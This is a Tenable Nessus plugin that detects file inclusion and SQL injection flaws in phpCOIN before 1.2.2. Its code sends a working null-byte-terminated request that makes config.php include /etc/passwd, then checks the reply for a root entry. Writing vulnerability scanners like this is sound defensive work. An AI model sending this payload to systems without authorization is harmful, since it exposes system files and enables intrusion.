#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that is prone to
several vulnerabilities. 

Description :

The remote host appears to be running phpCOIN, a software package for
web-hosting resellers to handle clients, orders, helpdesk queries, and
the like. 

The version of phpCOIN installed on the remote host fails to sanitize
user-supplied input to the '_CCFG[_PKG_PATH_DBSE]' parameter of the
'config.php' script before using it in a PHP 'require_once' function. 
Provided PHP's 'register_globals' setting is enabled, an
unauthenticated attacker may be able to exploit this flaw to read
arbitrary files on the remote host and or run arbitrary code, possibly
taken from third-party hosts, subject to the privileges of the web
server user id. 

In addition, the application uses the 'phpcoinsessid' cookie for
database queries in the 'coin_cfg.php' script without sanitizing it,
which opens the application up to SQL injection attacks provided PHP's
'magic_quotes_gpc' setting is disabled. 

See also :

http://retrogod.altervista.org/phpcoin122.html
http://forums.phpcoin.com/index.php?showtopic=5469

Solution :

Upgrade to 1.2.2 with the 2005-12-13 fix-file or later. 

Risk factor :

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";


if (description) {
  script_id(20300);
  script_version("$Revision: 1.7 $");

  script_cve_id("CVE-2005-4211", "CVE-2005-4212", "CVE-2005-4213");
  script_bugtraq_id(15830, 15831);
  script_xref(name:"OSVDB", value:"21724");
  script_xref(name:"OSVDB", value:"21725");

  script_name(english:"phpCOIN < 1.2.2 2005-12-13 Fix-File Multiple Vulnerabilities");
  script_summary(english:"Checks for multiple vulnerabilities in phpCOIN < 1.2.2 2005-12-13 fix-file");
 
  script_description(english:desc);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = make_list("/phpcoin", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Try to exploit the flaw to read a file.
  file = "/etc/passwd";
  req = http_get(
    item:string(
      dir, "/config.php?",
      "_CCFG[_PKG_PATH_DBSE]=", file, "%00"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error saying "failed to open stream" or "failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but passing
    #     remote URLs might still work.
    egrep(pattern:"/etc/passwd.+failed to open stream", string:res) ||
    "Failed opening required '/etc/passwd" >< res
  ) {
      report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        res
      );

    security_warning(port:port, data:report);
    exit(0);
  }
}
